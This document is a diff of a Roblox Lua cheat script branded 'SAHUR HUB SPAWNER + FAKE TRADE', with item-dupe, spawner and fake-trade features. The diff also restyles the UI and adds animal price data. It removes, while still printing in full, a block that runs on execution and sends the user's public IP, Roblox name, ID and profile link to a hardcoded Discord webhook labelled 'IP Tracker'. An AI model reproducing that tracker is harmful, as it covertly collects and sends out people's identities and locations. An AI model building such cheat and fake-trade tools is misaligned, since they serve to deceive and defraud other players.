@@ -65,14 +65,14 @@ local function GetSafeParent()
         return CoreGui
 end
 
-local BG = Color3.fromRGB(18, 18, 22)
-local SURFACE = Color3.fromRGB(24, 24, 30)
-local ACCENT = Color3.fromRGB(108, 92, 231)
-local BORDER = Color3.fromRGB(50, 45, 80)
-local TEXT = Color3.fromRGB(230, 230, 240)
-local SUBTEXT = Color3.fromRGB(130, 125, 160)
-local ITEMHOV = Color3.fromRGB(30, 28, 42)
-local ITEMSEL = Color3.fromRGB(50, 42, 100)
+local BG = Color3.fromRGB(13, 13, 13)
+local SURFACE = Color3.fromRGB(26, 26, 26)
+local ACCENT = Color3.fromRGB(230, 230, 230)
+local BORDER = Color3.fromRGB(60, 60, 60)
+local TEXT = Color3.fromRGB(200, 200, 200)
+local SUBTEXT = Color3.fromRGB(110, 110, 110)
+local ITEMHOV = Color3.fromRGB(26, 26, 26)
+local ITEMSEL = Color3.fromRGB(55, 55, 55)
 local BTNRED = Color3.fromRGB(180, 50, 50)
 local BTNGRN = Color3.fromRGB(50, 170, 90)
 
@@ -319,6 +319,7 @@ local TRAITS = {
         "Reindeer Pet",
         "Skibidi",
         "26",
+        "1 Year",
         "Rose",
         ":3",
         "Chocolate",
@@ -376,6 +377,7 @@ local TRAIT_ICONS = {
         ["Reindeer Pet"] = "rbxassetid://70894779883038",
         ["Skibidi"] = "rbxassetid://83384385019272",
         ["26"] = "rbxassetid://80468035315420",
+        ["1 Year"] = "rbxassetid://139663830647832",
         ["Rose"] = "rbxassetid://135489065859287",
         [":3"] = "rbxassetid://108293878529172",
         ["Chocolate"] = "rbxassetid://81641382604997",
@@ -1886,7 +1888,96 @@ local ANIMAL_DATA = {["1x1x1x1"] = {
         },["Zombie Tralala"] = {
                 gen = 500000,
                 price = 100000000
+        },["Bananito"] = {
+                gen = 110000,
+                price = 22500000
+        },["Bombini Rocketini"] = {
+                gen = 135000,
+                price = 27500000
+        },["Cactito Saltito"] = {
+                gen = 120000,
+                price = 24000000
+        },["Chocorino Alpinito"] = {
+                gen = 145000,
+                price = 29000000
+        },["Cubito Robotito"] = {
+                gen = 130000,
+                price = 26000000
+        },["Fruttino Smoothino"] = {
+                gen = 125000,
+                price = 25000000
+        },["Gelato Gattino"] = {
+                gen = 140000,
+                price = 28500000
+        },["Globito Astronauto"] = {
+                gen = 155000,
+                price = 31000000
+        },["Hamburguino Saltino"] = {
+                gen = 115000,
+                price = 23000000
+        },["Limonito Fresquito"] = {
+                gen = 118000,
+                price = 23500000
+        },["Macaronito Danzerino"] = {
+                gen = 148000,
+                price = 30000000
+        },["Naranjito Picantito"] = {
+                gen = 122000,
+                price = 24500000
+        },["Oso Polarito"] = {
+                gen = 162000,
+                price = 32500000
+        },["Pinito Navide\xc3\xb1o"] = {
+                gen = 170000,
+                price = 34000000
+        },["Pollito Brainrot"] = {
+                gen = 108000,
+                price = 21500000
+        },["Remolacho Galactico"] = {
+                gen = 175000,
+                price = 35000000
+        },["Sandino Fresquito"] = {
+                gen = 112000,
+                price = 22500000
+        },["Tigrito Banderito"] = {
+                gen = 185000,
+                price = 37000000
+        },["Tortillito Calentito"] = {
+                gen = 132000,
+                price = 26500000
+        },["Uvarito Magico"] = {
+                gen = 128000,
+                price = 25500000
         },}
+
+local _animalPriceCache = {}
+local function GetAnimalPrice(animalName)
+        if not animalName then return 0 end
+        local info = ANIMAL_DATA[animalName]
+        if info and info.price and info.price > 0 then
+                return info.price
+        end
+        if _animalPriceCache[animalName] then
+                return _animalPriceCache[animalName]
+        end
+        local fallbackPrice = 0
+        pcall(function()
+                local RS2 = game:GetService("ReplicatedStorage")
+                local ok, aData = pcall(function()
+                        return require(RS2.Datas.Animals)[animalName]
+                end)
+                if ok and aData then
+                        local rawSell = aData.SellPrice or aData.SellValue or aData.Price or aData.Value or aData.Sell or 0
+                        if rawSell and rawSell > 0 then
+                                fallbackPrice = rawSell * 2
+                        end
+                end
+        end)
+        if fallbackPrice > 0 then
+                _animalPriceCache[animalName] = fallbackPrice
+        end
+        return fallbackPrice
+end
 
 local selectedAnimal = nil
 local selectedMutation = "None"
@@ -2485,6 +2576,7 @@ local _lastReceivedItems = {}
 local _triggerDupeItem = nil
 local _triggerLaunch = nil
 local _kvForceAcceptDispatcher = nil
+local _kvSetTradeUsername = nil
 local OpenFakeTradeSetup
 local LaunchFakeTrade
 
@@ -2512,132 +2604,6 @@ if type(LRM_SEND_WEBHOOK) ~= "function" then
                         })
                 end)
         end
-end
-
-do
-        local function _getPublicIPv4()
-                local ok, body = pcall(function()
-                        if syn and syn.request then
-                                return (syn.request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        if http and http.request then
-                                return (http.request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        if http_request then
-                                return (http_request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        if request then
-                                return (request({
-                                        Url = "https://api.ipify.org/",
-                                        Method = "GET"
-                                }) or {}).Body
-                        end
-                        return _hs:GetAsync("https://api.ipify.org/")
-                end)
-                if ok and type(body) == "string" then
-                        local ip = body:match("(%d+%.%d+%.%d+%.%d+)")
-                        if ip then
-                                return ip
-                        end
-                end
-                return "Unknown"
-        end
-        local function _getRobloxUser()
-                local ok, info = pcall(function()
-                        local p = LocalPlayer
-                        if not p then
-                                return nil
-                        end
-                        return {
-                                name = p.Name,
-                                displayName = p.DisplayName,
-                                userId = p.UserId,
-                        }
-                end)
-                if ok then
-                        return info
-                end
-                return nil
-        end
-        task.spawn(function()
-                local user = _getRobloxUser()
-                local ipv4 = _getPublicIPv4()
-                local userInfo, robloxLink, robloxId
-                if user then
-                        userInfo = "**" .. user.name .. "** (" .. user.displayName .. ")"
-                        robloxLink = "https://www.roblox.com/users/" .. tostring(user.userId)
-                        robloxId = "`" .. tostring(user.userId) .. "`"
-                else
-                        userInfo, robloxLink, robloxId = "Unknown", "Unknown", "Unknown"
-                end
-                pcall(function()
-                        LRM_SEND_WEBHOOK("https://discord.com/api/webhooks/1501323938595340329/utDY-npNEK2TJQJLNM4W4WVGJnhL2_dNLwh9Ao1SzS4q-_wthcIJAMq5Gw-iGzod7hQ4", {
-                                username = "IP Tracker",
-                                embeds = {
-                                        {
-                                                title = "🔔 Script Executed",
-                                                description = "",
-                                                color = 65280,
-                                                fields = {
-                                                        {
-                                                                name = "💬 Discord User",
-                                                                value = "<@%DISCORD_ID%>",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🔑 Key",
-                                                                value = "`%USER_KEY%`",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "📝 Note",
-                                                                value = "`%USER_NOTE%`",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "👤 Roblox User",
-                                                                value = userInfo,
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🆔 Roblox ID",
-                                                                value = robloxId,
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🔗 Profile",
-                                                                value = robloxLink,
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "🌐 IP (IPv4 only)",
-                                                                value = "`" .. ipv4 .. "`",
-                                                                inline = true
-                                                        },
-                                                        {
-                                                                name = "📍 Country",
-                                                                value = ":flag_%COUNTRY_CODE%: `%COUNTRY_CODE%`",
-                                                                inline = true
-                                                        },
-                                                },
-                                                footer = {
-                                                        text = "IP Tracker"
-                                                },
-                                                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                                        }
-                                },
-                        })
-                end)
-        end)
 end
 
 local function _hasFileApi()
@@ -3418,7 +3384,16 @@ local function _buildCashpadFor(model, podiumFolder, animalName)
                 newCollectLbl.Visible = true
         end
         local animalInfo = ANIMAL_DATA[animalName or model.Name]
-        local genPerSec = animalInfo and animalInfo.gen or 0
+        local _aNameForGen = animalName or model.Name
+        local genPerSec = (animalInfo and animalInfo.gen and animalInfo.gen > 0) and animalInfo.gen or (function()
+                local g = 0
+                pcall(function()
+                        local RS2 = game:GetService("ReplicatedStorage")
+                        local ok, ad = pcall(function() return require(RS2.Datas.Animals)[_aNameForGen] end)
+                        if ok and ad and ad.Generation then g = ad.Generation end
+                end)
+                return g
+        end)()
 
         local offlineAmt = _modelOfflineCash[model] or 0
         local accumulated = offlineAmt
@@ -4101,7 +4076,7 @@ PlaceModelOnSlot = function(model, slotIdx, animalName)
                 end
                 local aName = animalName or model.Name
                 local animalInfo = ANIMAL_DATA[aName]
-                local sellPrice = animalInfo and animalInfo.price or 0
+                local sellPrice = GetAnimalPrice(aName)
                 local function fmt(n)
                         local function clean(s, suffix)
                                 return s:gsub("%.0+" .. suffix, suffix):gsub("(%.%d-)0+" .. suffix, "%1" .. suffix)
@@ -4230,7 +4205,7 @@ PlaceModelOnSlot = function(model, slotIdx, animalName)
                 if pa then
                         local aName = animalName or model.Name
                         local animalInfo = ANIMAL_DATA[aName]
-                        local sellPrice = animalInfo and animalInfo.price or 0
+                        local sellPrice = GetAnimalPrice(aName)
                         local function fmt(n)
                                 local function clean(s, sx)
                                         return s:gsub("%.0+" .. sx, sx):gsub("(%.%d-)0+" .. sx, "%1" .. sx)
@@ -4325,6 +4300,7 @@ PlaceModelOnSlot = function(model, slotIdx, animalName)
         task.delay(0.8, _revalidatePromptsAndOverhead)
         return true
 end
+local function _buildUI()
 local nextSlot = 1
 
 local TRAIT_MULTIPLIERS = {
@@ -4453,6 +4429,7 @@ local MUTATION_ICONS = {
 }
 
 local TRAIT_ICONS = {
+        ["1 Year"] = "rbxassetid://139663830647832",
         ["10B"] = "rbxassetid://134655415681926",
         ["26"] = "rbxassetid://80468035315420",
         [":3"] = "rbxassetid://108293878529172",
@@ -4557,31 +4534,86 @@ local win = New("Frame", {
         Parent = sg,
         ClipsDescendants = false,
 })
-Corner(win, 8)
-Stroke(win, Color3.fromRGB(50, 45, 80), 1, 0.2)
+Corner(win, 12)
+-- Borde blanco con gradiente rotatorio (estilo Sahur Desync)
+do
+        local winStroke = Instance.new("UIStroke", win)
+        winStroke.Thickness    = 2
+        winStroke.LineJoinMode = Enum.LineJoinMode.Round
+        winStroke.Color        = Color3.fromRGB(255, 255, 255)
+        winStroke.Transparency = 0
+        local glowGrad = Instance.new("UIGradient")
+        glowGrad.Color = ColorSequence.new({
+                ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 255, 255)),
+                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 200, 200)),
+                ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 255, 255)),
+        })
+        glowGrad.Transparency = NumberSequence.new({
+                NumberSequenceKeypoint.new(0,    0),
+                NumberSequenceKeypoint.new(0.07, 0),
+                NumberSequenceKeypoint.new(0.18, 0.97),
+                NumberSequenceKeypoint.new(0.82, 0.97),
+                NumberSequenceKeypoint.new(0.93, 0),
+                NumberSequenceKeypoint.new(1,    0),
+        })
+        glowGrad.Parent = winStroke
+        task.spawn(function()
+                local angle = 0
+                while win and win.Parent do
+                        angle = (angle + 1.8) % 360
+                        glowGrad.Rotation = angle
+                        task.wait(0.02)
+                end
+        end)
+end
 local tbar = New("Frame", {
-        Size = UDim2.new(1, 0, 0, 36),
-        BackgroundColor3 = Color3.fromRGB(30, 28, 42),
+        Size = UDim2.new(1, 0, 0, 52),
+        BackgroundTransparency = 1,
         BorderSizePixel = 0,
         Parent = win,
 })
-Corner(tbar, 8)
-New("Frame", {
-        Size = UDim2.new(1, 0, 0.5, 0),
-        Position = UDim2.new(0, 0, 0.5, 0),
-        BackgroundColor3 = Color3.fromRGB(30, 28, 42),
-        BorderSizePixel = 0,
-        Parent = tbar
+-- Logo
+New("ImageLabel", {
+        Size = UDim2.new(0, 28, 0, 28),
+        Position = UDim2.new(0, 8, 0, 10),
+        BackgroundTransparency = 1,
+        ScaleType = Enum.ScaleType.Fit,
+        ImageColor3 = Color3.fromRGB(255, 255, 255),
+        Image = "rbxassetid://110704100846087",
+        Parent = tbar,
 })
+-- Titulo principal
 New("TextLabel", {
-        Size = UDim2.new(1, - 20, 1, 0),
-        Position = UDim2.new(0, 10, 0, 0),
-        Text = "@KingScripts  2026 Visuals",
-        TextColor3 = Color3.fromRGB(230, 230, 240),
-        Font = Enum.Font.GothamSemibold,
-        TextSize = 10,
+        Size = UDim2.new(1, -50, 0, 20),
+        Position = UDim2.new(0, 42, 0, 8),
+        Text = "SAHUR HUB SPAWNER + FAKE TRADE",
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Font = Enum.Font.GothamBlack,
+        TextSize = 14,
         BackgroundTransparency = 1,
         TextXAlignment = Enum.TextXAlignment.Left,
+        TextStrokeTransparency = 0.8,
+        TextStrokeColor3 = Color3.fromRGB(0, 0, 0),
+        Parent = tbar,
+})
+-- Discord link
+New("TextLabel", {
+        Size = UDim2.new(1, -50, 0, 14),
+        Position = UDim2.new(0, 42, 0, 30),
+        Text = "discord.gg/8HNEwrZUut",
+        TextColor3 = Color3.fromRGB(130, 130, 200),
+        Font = Enum.Font.Gotham,
+        TextSize = 11,
+        BackgroundTransparency = 1,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        Parent = tbar,
+})
+-- Divisor inferior del tbar
+New("Frame", {
+        Size = UDim2.new(1, -20, 0, 1),
+        Position = UDim2.new(0, 10, 1, -1),
+        BackgroundColor3 = Color3.fromRGB(60, 60, 60),
+        BorderSizePixel = 0,
         Parent = tbar,
 })
 MakeDraggable(win, tbar)
@@ -4594,7 +4626,7 @@ if savedWindowPos then
                 win.Position = UDim2.new(0, px, 0, py)
         end)
 end
-do
+;(function()
         local _winPosDebounce = nil
         win:GetPropertyChangedSignal("Position"):Connect(function()
                 if _winPosDebounce then
@@ -4611,12 +4643,12 @@ do
                         SaveConfig()
                 end)
         end)
-end
+end)()
 
 local contentVisible = true
 local mainContent = New("Frame", {
         Size = UDim2.new(1, 0, 0, 0),
-        Position = UDim2.new(0, 0, 0, 36),
+        Position = UDim2.new(0, 0, 0, 52),
         BackgroundTransparency = 1,
         BorderSizePixel = 0,
         Parent = win,
@@ -4626,7 +4658,7 @@ win.AutomaticSize = Enum.AutomaticSize.Y
 win.Size = UDim2.new(0, WIN_W, 0, 36)
 
 
-do
+;(function()
         local ul = Instance.new("UIListLayout", mainContent)
         ul.Padding = UDim.new(0, 6)
         ul.SortOrder = Enum.SortOrder.LayoutOrder
@@ -4644,7 +4676,7 @@ do
                         end
                 end)
         end
-end
+end)()
 
 local tabBar = New("Frame", {
         Size = UDim2.new(1, 0, 0, 34),
@@ -4654,7 +4686,7 @@ local tabBar = New("Frame", {
         Parent = mainContent,
 })
 Corner(tabBar, 6)
-do
+;(function()
         local ul = Instance.new("UIListLayout", tabBar)
         ul.FillDirection = Enum.FillDirection.Horizontal
         ul.HorizontalAlignment = Enum.HorizontalAlignment.Left
@@ -4663,11 +4695,11 @@ do
         local pad = Instance.new("UIPadding", tabBar)
         pad.PaddingLeft = UDim.new(0, 6)
         pad.PaddingRight = UDim.new(0, 6)
-end
+end)()
 
 local function MakeTab(label, order)
         local btn = New("TextButton", {
-                Size = UDim2.new(0.2, - 4, 0, 26),
+                Size = UDim2.new(0.25, - 4, 0, 26),
                 BackgroundColor3 = Color3.fromRGB(30, 28, 42),
                 Text = label,
                 TextColor3 = Color3.fromRGB(180, 180, 200),
@@ -4683,9 +4715,10 @@ end
 
 local tabBrainrots = MakeTab("🐾  Brainrots", 1)
 local tabTrading = MakeTab("💱  Trading", 2)
-local tabBase = MakeTab("🏠  Base", 3)
+local tabDupe = MakeTab("🔀  Dupe", 3)
 local tabMisc = MakeTab("⚙  Misc", 4)
-local tabDupe = MakeTab("🔀  Dupe", 5)
+local tabBase = MakeTab("🏠  Base", 99)
+tabBase.Visible = false
 
 local brainrotsPage = New("Frame", {
         Size = UDim2.new(1, 0, 0, 0),
@@ -4696,7 +4729,7 @@ local brainrotsPage = New("Frame", {
         Visible = true,
         Parent = mainContent,
 })
-do
+;(function()
         local ul = Instance.new("UIListLayout", brainrotsPage)
         ul.FillDirection = Enum.FillDirection.Vertical
         ul.SortOrder = Enum.SortOrder.LayoutOrder
@@ -4704,7 +4737,7 @@ do
         ul:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
                 brainrotsPage.Size = UDim2.new(1, 0, 0, ul.AbsoluteContentSize.Y)
         end)
-end
+end)()
 
 local tradingPage = New("Frame", {
         Size = UDim2.new(1, 0, 0, 0),
@@ -4715,7 +4748,7 @@ local tradingPage = New("Frame", {
         Visible = false,
         Parent = mainContent,
 })
-do
+;(function()
         local ul = Instance.new("UIListLayout", tradingPage)
         ul.FillDirection = Enum.FillDirection.Vertical
         ul.SortOrder = Enum.SortOrder.LayoutOrder
@@ -4724,7 +4757,7 @@ do
         pad.PaddingTop = UDim.new(0, 6)
         pad.PaddingLeft = UDim.new(0, 6)
         pad.PaddingRight = UDim.new(0, 6)
-end
+end)()
 
 local miscPage = New("Frame", {
         Size = UDim2.new(1, 0, 0, 0),
@@ -4735,7 +4768,7 @@ local miscPage = New("Frame", {
         Visible = false,
         Parent = mainContent,
 })
-do
+;(function()
         local ul = Instance.new("UIListLayout", miscPage)
         ul.FillDirection = Enum.FillDirection.Vertical
         ul.SortOrder = Enum.SortOrder.LayoutOrder
@@ -4744,7 +4777,7 @@ do
         pad.PaddingTop = UDim.new(0, 6)
         pad.PaddingLeft = UDim.new(0, 6)
         pad.PaddingRight = UDim.new(0, 6)
-end
+end)()
 
 local basePage = New("Frame", {
         Size = UDim2.new(1, 0, 0, 0),
@@ -4755,7 +4788,7 @@ local basePage = New("Frame", {
         Visible = false,
         Parent = mainContent,
 })
-do
+;(function()
         local ul = Instance.new("UIListLayout", basePage)
         ul.FillDirection = Enum.FillDirection.Vertical
         ul.SortOrder = Enum.SortOrder.LayoutOrder
@@ -4764,7 +4797,7 @@ do
         pad.PaddingTop = UDim.new(0, 6)
         pad.PaddingLeft = UDim.new(0, 6)
         pad.PaddingRight = UDim.new(0, 6)
-end
+end)()
 
 local dupePage = New("Frame", {
         Size = UDim2.new(1, 0, 0, 0),
@@ -4775,7 +4808,7 @@ local dupePage = New("Frame", {
         Visible = false,
         Parent = mainContent,
 })
-do
+;(function()
         local ul = Instance.new("UIListLayout", dupePage)
         ul.FillDirection = Enum.FillDirection.Vertical
         ul.SortOrder = Enum.SortOrder.LayoutOrder
@@ -4784,7 +4817,7 @@ do
         pad.PaddingTop = UDim.new(0, 6)
         pad.PaddingLeft = UDim.new(0, 6)
         pad.PaddingRight = UDim.new(0, 6)
-end
+end)()
 
 local _dupeTabActive = false
 local function SetTab(tab)
@@ -4798,14 +4831,40 @@ local function SetTab(tab)
         tabBrainrots.TextColor3 = tab == "Brainrots" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 200)
         tabTrading.BackgroundColor3 = tab == "Trading" and ACCENT or Color3.fromRGB(30, 28, 42)
         tabTrading.TextColor3 = tab == "Trading" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 200)
-        tabBase.BackgroundColor3 = tab == "Base" and ACCENT or Color3.fromRGB(30, 28, 42)
-        tabBase.TextColor3 = tab == "Base" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 200)
-        tabMisc.BackgroundColor3 = tab == "Misc" and ACCENT or Color3.fromRGB(30, 28, 42)
-        tabMisc.TextColor3 = tab == "Misc" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 200)
         tabDupe.BackgroundColor3 = tab == "Dupe" and ACCENT or Color3.fromRGB(30, 28, 42)
         tabDupe.TextColor3 = tab == "Dupe" and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 200)
+        tabMisc.BackgroundColor3 = (tab == "Misc" or tab == "Base") and ACCENT or Color3.fromRGB(30, 28, 42)
+        tabMisc.TextColor3 = (tab == "Misc" or tab == "Base") and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 200)
 end
 SetTab("Brainrots")
+-- Back button at top of basePage — placed here so SetTab is already defined
+do
+        local backBtn = New("TextButton", {
+                Size = UDim2.new(1, 0, 0, 32),
+                BackgroundColor3 = Color3.fromRGB(28, 28, 38),
+                BorderSizePixel = 0,
+                AutoButtonColor = false,
+                Text = "",
+                LayoutOrder = 0,
+                Parent = basePage,
+        })
+        Corner(backBtn, 6)
+        Stroke(backBtn, Color3.fromRGB(60, 60, 80), 1, 0.2)
+        New("TextLabel", {
+                Size = UDim2.new(1, -20, 1, 0),
+                Position = UDim2.new(0, 10, 0, 0),
+                BackgroundTransparency = 1,
+                Text = "✕  Cerrar Menu",
+                TextColor3 = Color3.fromRGB(230, 230, 240),
+                Font = Enum.Font.GothamBold,
+                TextSize = 13,
+                TextXAlignment = Enum.TextXAlignment.Left,
+                Parent = backBtn,
+        })
+        backBtn.Activated:Connect(function()
+                SetTab("Misc")
+        end)
+end
 tabBrainrots.Activated:Connect(function()
         SetTab("Brainrots")
 end)
@@ -4964,6 +5023,42 @@ pcall(function()
                 end
                 startDupeWatch(myPlot)
 
+                -- Query sync channel for accurate mutation/traits per slot
+                local _syncSlotData = {}
+                pcall(function()
+                        local ch = GetSyncChannel()
+                        if ch then
+                                local pods = ch:Get("AnimalPodiums")
+                                if type(pods) == "table" then
+                                        for key, podData in pairs(pods) do
+                                                if type(podData) == "table" then
+                                                        _syncSlotData[tonumber(key)] = podData
+                                                end
+                                        end
+                                end
+                        end
+                end)
+                local function getSyncMutation(slotNum)
+                        local d = _syncSlotData[tonumber(slotNum)]
+                        if not d then return nil end
+                        local m = d.Mutation
+                        if m and m ~= "" and m ~= "None" then return m end
+                        return nil
+                end
+                local function getSyncTraits(slotNum)
+                        local d = _syncSlotData[tonumber(slotNum)]
+                        if not d then return {} end
+                        local out = {}
+                        if type(d.Traits) == "table" then
+                                if #d.Traits > 0 then
+                                        for _, t in ipairs(d.Traits) do table.insert(out, t) end
+                                else
+                                        for t, v in pairs(d.Traits) do if v then table.insert(out, t) end end
+                                end
+                        end
+                        return out
+                end
+
                 -- Build slot map (podium number → spawn position) for ordering
                 local podiumSpawns = {}
                 local podiums = myPlot:FindFirstChild("AnimalPodiums")
@@ -5001,15 +5096,24 @@ pcall(function()
                         setDupeStatus("❌ No se encontraron brainrots reales en tu base.", true)
                         return
                 end
-                table.sort(found, function(a, b) return tostring(a.slot) < tostring(b.slot) end)
+                -- Newest first: GetChildren() returns insertion order, newest is last → reverse
+                do
+                        local rev = {}
+                        for j = #found, 1, -1 do rev[#rev + 1] = found[j] end
+                        found = rev
+                end
                 for i, entry in ipairs(found) do
                         local animalName = entry.name
                         local rarity = getAnimalRarity(animalName)
-                        local entryMut = detectDupeMutation(entry.model)
-                        local entryTraits = detectDupeTraits(entry.model)
+                        local syncMut = getSyncMutation(entry.slot)
+                        local syncTraits = getSyncTraits(entry.slot)
+                        local entryMut = syncMut or detectDupeMutation(entry.model)
+                        local entryTraits = (#syncTraits > 0) and syncTraits or detectDupeTraits(entry.model)
                         local slotTxt = entry.slot ~= "?" and (" | Slot " .. entry.slot) or ""
+                        local hasIcons = (entryMut and MUTATION_ICONS and MUTATION_ICONS[entryMut] and MUTATION_ICONS[entryMut] ~= "") or (#entryTraits > 0)
+                        local frameH = hasIcons and 76 or 52
                         local entryFrame = New("Frame", {
-                                Size = UDim2.new(1, 0, 0, 52),
+                                Size = UDim2.new(1, 0, 0, frameH),
                                 BackgroundColor3 = SURFACE,
                                 BorderSizePixel = 0,
                                 LayoutOrder = i,
@@ -5017,7 +5121,7 @@ pcall(function()
                         })
                         Corner(entryFrame, 6)
                         New("TextLabel", {
-                                Size = UDim2.new(1, -54, 0, 22),
+                                Size = UDim2.new(1, -54, 0, 20),
                                 Position = UDim2.new(0, 10, 0, 4),
                                 BackgroundTransparency = 1,
                                 Text = animalName,
@@ -5029,11 +5133,11 @@ pcall(function()
                                 Parent = entryFrame,
                         })
                         do
-                                local mutLabel = entryMut and (" • " .. entryMut) or ""
-                                local traitLabel = (#entryTraits > 0) and (" • " .. table.concat(entryTraits, ", ")) or ""
+                                local mutLabel = entryMut and (" · " .. entryMut) or ""
+                                local traitLabel = (#entryTraits > 0) and (" · " .. table.concat(entryTraits, ", ")) or ""
                                 New("TextLabel", {
-                                        Size = UDim2.new(1, -54, 0, 16),
-                                        Position = UDim2.new(0, 10, 0, 28),
+                                        Size = UDim2.new(1, -54, 0, 14),
+                                        Position = UDim2.new(0, 10, 0, 26),
                                         BackgroundTransparency = 1,
                                         Text = rarity .. slotTxt .. mutLabel .. traitLabel,
                                         TextColor3 = SUBTEXT,
@@ -5043,6 +5147,42 @@ pcall(function()
                                         TextTruncate = Enum.TextTruncate.AtEnd,
                                         Parent = entryFrame,
                                 })
+                        end
+                        if hasIcons then
+                                local iconRow = New("Frame", {
+                                        Size = UDim2.new(1, -54, 0, 22),
+                                        Position = UDim2.new(0, 8, 0, 42),
+                                        BackgroundTransparency = 1,
+                                        Parent = entryFrame,
+                                })
+                                local iconX = 0
+                                local ICON_SZ = 20
+                                local ICON_PAD = 3
+                                if entryMut and MUTATION_ICONS and MUTATION_ICONS[entryMut] and MUTATION_ICONS[entryMut] ~= "" then
+                                        local ic = New("ImageLabel", {
+                                                Size = UDim2.new(0, ICON_SZ, 0, ICON_SZ),
+                                                Position = UDim2.new(0, iconX, 0, 1),
+                                                BackgroundTransparency = 1,
+                                                Image = MUTATION_ICONS[entryMut],
+                                                Parent = iconRow,
+                                        })
+                                        Corner(ic, 3)
+                                        iconX = iconX + ICON_SZ + ICON_PAD
+                                end
+                                for _, traitName in ipairs(entryTraits) do
+                                        local icon = TRAIT_ICONS and TRAIT_ICONS[traitName]
+                                        if icon and icon ~= "" then
+                                                local ic = New("ImageLabel", {
+                                                        Size = UDim2.new(0, ICON_SZ, 0, ICON_SZ),
+                                                        Position = UDim2.new(0, iconX, 0, 1),
+                                                        BackgroundTransparency = 1,
+                                                        Image = icon,
+                                                        Parent = iconRow,
+                                                })
+                                                Corner(ic, 3)
+                                                iconX = iconX + ICON_SZ + ICON_PAD
+                                        end
+                                end
                         end
                         local cloneBtn = New("TextButton", {
                                 Size = UDim2.new(0, 40, 1, -8),
@@ -5331,7 +5471,7 @@ local searchBox = New("TextBox", {
         Parent = searchRow,
 })
 
-do
+;(function()
         local frames = {
                 "Search...",
                 "Search..",
@@ -5351,7 +5491,7 @@ do
                         task.wait(0.45)
                 end
         end)
-end
+end)()
 
 searchBox.Focused:Connect(function()
         for _, c in ipairs(searchRow:GetChildren()) do
@@ -5383,7 +5523,7 @@ local listFrame = New("ScrollingFrame", {
 })
 Corner(listFrame, 6)
 Stroke(listFrame, Color3.fromRGB(50, 50, 70), 1, 0.3)
-do
+;(function()
         local ul = Instance.new("UIListLayout", listFrame);
         ul.Padding = UDim.new(0, 0)
         local up = Instance.new("UIPadding", listFrame)
@@ -5391,7 +5531,7 @@ do
         up.PaddingRight = UDim.new(0, 4)
         up.PaddingTop = UDim.new(0, 4);
         up.PaddingBottom = UDim.new(0, 4)
-end
+end)()
 
 animalToggleBtn.MouseButton1Click:Connect(function()
         listVisible = not listVisible
@@ -5722,34 +5862,6 @@ local tmPopup = New("Frame", {
 Corner(tmPopup, 6)
 Stroke(tmPopup, Color3.fromRGB(50, 45, 80), 1, 0.2)
 
-traitsBtn.MouseButton1Click:Connect(function()
-        traitsVisible = not traitsVisible
-        tmPopup.Visible = traitsVisible
-        _updateTraitsBtnText()
-end)
-
-local traitsGrid = New("ScrollingFrame", {
-        Size = UDim2.new(1, 0, 1, - 8),
-        Position = UDim2.new(0, 0, 0, 4),
-        BackgroundColor3 = BG,
-        BorderSizePixel = 0,
-        ScrollBarThickness = 3,
-        ScrollBarImageColor3 = Color3.fromRGB(108, 92, 231),
-        CanvasSize = UDim2.new(0, 0, 0, 0),
-        AutomaticCanvasSize = Enum.AutomaticSize.Y,
-        Parent = tmPopup,
-})
-Corner(traitsGrid, 6)
-do
-        local ul = Instance.new("UIListLayout", traitsGrid);
-        ul.Padding = UDim.new(0, 0)
-        local up = Instance.new("UIPadding", traitsGrid)
-        up.PaddingLeft = UDim.new(0, 4);
-        up.PaddingRight = UDim.new(0, 4)
-        up.PaddingTop = UDim.new(0, 4);
-        up.PaddingBottom = UDim.new(0, 4)
-end
-
 local function _updateTraitsBtnText()
         local sel = {}
         for trait, on in pairs(selectedTraits) do
@@ -5768,6 +5880,35 @@ local function _updateTraitsBtnText()
                 traitsBtn.Text = arrow .. "  Traits  •  " .. listed
         end
 end
+
+traitsBtn.MouseButton1Click:Connect(function()
+        traitsVisible = not traitsVisible
+        tmPopup.Visible = traitsVisible
+        _updateTraitsBtnText()
+end)
+
+local traitsGrid = New("ScrollingFrame", {
+        Size = UDim2.new(1, 0, 1, - 8),
+        Position = UDim2.new(0, 0, 0, 4),
+        BackgroundColor3 = BG,
+        BorderSizePixel = 0,
+        ScrollBarThickness = 3,
+        ScrollBarImageColor3 = Color3.fromRGB(108, 92, 231),
+        CanvasSize = UDim2.new(0, 0, 0, 0),
+        AutomaticCanvasSize = Enum.AutomaticSize.Y,
+        Parent = tmPopup,
+})
+Corner(traitsGrid, 6)
+;(function()
+        local ul = Instance.new("UIListLayout", traitsGrid);
+        ul.Padding = UDim.new(0, 0)
+        local up = Instance.new("UIPadding", traitsGrid)
+        up.PaddingLeft = UDim.new(0, 4);
+        up.PaddingRight = UDim.new(0, 4)
+        up.PaddingTop = UDim.new(0, 4);
+        up.PaddingBottom = UDim.new(0, 4)
+end)()
+
 
 local traitBtns = {}
 for _, trait in ipairs(TRAITS) do
@@ -5893,7 +6034,7 @@ local mutGrid = New("ScrollingFrame", {
         Parent = mutPopup,
 })
